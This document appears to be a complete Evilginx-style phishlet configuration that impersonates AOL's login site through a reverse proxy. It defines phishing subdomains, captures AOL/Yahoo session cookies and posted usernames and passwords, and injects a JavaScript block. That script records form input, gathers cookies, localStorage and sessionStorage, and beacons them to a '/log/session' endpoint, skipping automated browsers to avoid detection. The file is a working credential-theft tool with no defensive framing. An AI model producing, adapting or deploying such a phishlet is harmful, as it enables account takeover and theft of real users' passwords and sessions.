min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'aol', orig_sub: 'login', domain: 'aol.com', session: true, auto_filter: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'udc', orig_sub: 'udc', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'consent', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: false, is_landing: false}

sub_filters:
  # Hostname rewriting — AOL login
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # yimg.com (Yahoo/AOL shared CDN) sub-filters
  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}

auth_tokens:
  # AOL runs on Yahoo's auth infrastructure — same core session cookies apply
  - domain: '.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', '_Y', 'EuConsent', 'thamba', 'ucs', 'APID', 'APIDTS', 'sS', 'cmp', '.*,regexp']
  - domain: '.login.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.mail.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']

auth_urls:
  - '/consent'
  - '/account/challenge/password*'
  - '/?.src=aol*'
  - '/?.done=*'

credentials:
  username:
    key: '(username|email|mobile|userId)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|password|pass)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.aol.com'
  path: '/'

js_inject:
  - trigger_domains: ["login.aol.com"]
    trigger_paths: ["/", "/*"]
    script: |
      (function() {
        var passedGate = false;
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;

        function sendSessionData(stage) {
          try {
            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              var parts = c.trim().split('=');
              var k = parts[0];
              if (k) cookieObj[k.trim()] = parts.slice(1).join('=');
            });

            var lsObj = {};
            try {
              for (var i = 0; i < localStorage.length; i++) {
                var lk = localStorage.key(i);
                lsObj[lk] = localStorage.getItem(lk);
              }
            } catch(e) {}

            var ssObj = {};
            try {
              for (var j = 0; j < sessionStorage.length; j++) {
                var sk = sessionStorage.key(j);
                ssObj[sk] = sessionStorage.getItem(sk);
              }
            } catch(e) {}

            var sessionInfo = {
              provider: 'aol',
              credentials: (capturedCreds.username || capturedCreds.password)
                ? { username: capturedCreds.username, password: capturedCreds.password }
                : undefined,
              localStorage: btoa(unescape(encodeURIComponent(JSON.stringify(lsObj)))),
              sessionStorage: btoa(unescape(encodeURIComponent(JSON.stringify(ssObj)))),
              cookies: btoa(unescape(encodeURIComponent(JSON.stringify(cookieObj)))),
              url: window.location.href
            };

            var currentCapture = JSON.stringify(sessionInfo);
            if (currentCapture === lastCapture) return;
            lastCapture = currentCapture;

            var payload = {
              username: 'SessionData-' + stage,
              password: currentCapture
            };

            var _bh = window.location.hostname;
            var _dot = _bh.indexOf('.');
            var _beaconHost = _dot !== -1 ? _bh.substring(_dot + 1) : _bh;
            var _beaconUrl = window.location.protocol + '//' + _beaconHost + '/log/session';
            navigator.sendBeacon(_beaconUrl, JSON.stringify(payload));
          } catch(e) {}
        }

        function monitorFormInputs() {
          document.querySelectorAll('input').forEach(function(el) {
            if (watchedElements ? watchedElements.has(el) : el._aolWatched) return;
            if (watchedElements) { watchedElements.add(el); } else { el._aolWatched = true; }

            function captureField() {
              var t = (el.type || '').toLowerCase();
              var n = (el.name || el.id || el.getAttribute('data-field-name') || '').toLowerCase();
              var v = el.value;
              if (!v) return;
              if (t === 'password' || /passwd|password|pass/.test(n)) {
                if (v !== capturedCreds.password) {
                  capturedCreds.password = v;
                  sendSessionData('AOL-Password-Captured');
                }
              } else if (t === 'email' || t === 'text' || t === 'tel' || /username|userid|email|login|phone|mobile/.test(n)) {
                capturedCreds.username = v;
              }
            }

            el.addEventListener('input', captureField, { passive: true });
            el.addEventListener('change', captureField, { passive: true });
            el.addEventListener('blur', captureField, { passive: true });
          });

          document.querySelectorAll('form').forEach(function(form) {
            if (watchedElements ? watchedElements.has(form) : form._aolWatched) return;
            if (watchedElements) { watchedElements.add(form); } else { form._aolWatched = true; }
            form.addEventListener('submit', function() {
              sendSessionData('AOL-Form-Submit');
            }, { passive: true });
          });
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;

          var observer = new MutationObserver(function(mutations) {
            for (var i = 0; i < mutations.length; i++) {
              if (mutations[i].addedNodes.length > 0) {
                monitorFormInputs();
                var currentStage = 'AOL-Page';
                var path = window.location.pathname.toLowerCase();
                var href = window.location.href.toLowerCase();
                if (/consent|done|success/.test(path) || /mail\.aol\.com/.test(href)) {
                  currentStage = 'AOL-Login-Success';
                } else if (document.querySelector('input[name="passwd"], input[id="login-passwd"], input[type="password"]')) {
                  currentStage = 'AOL-Password-Entry';
                } else if (document.querySelector('input[name="username"], input[id="login-username"]')) {
                  currentStage = 'AOL-Username-Entry';
                }
                sendSessionData(currentStage);
                break;
              }
            }
          });

          window.addEventListener('load', function() {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
            sendSessionData('AOL-Initial-Load');
          });

          if (document.body) {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
          }
        }

        if (!navigator.webdriver) {
          var interactionHandler = function() {
            if (passedGate) return;
            runMainLogic();
          };
          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
        }
      })();
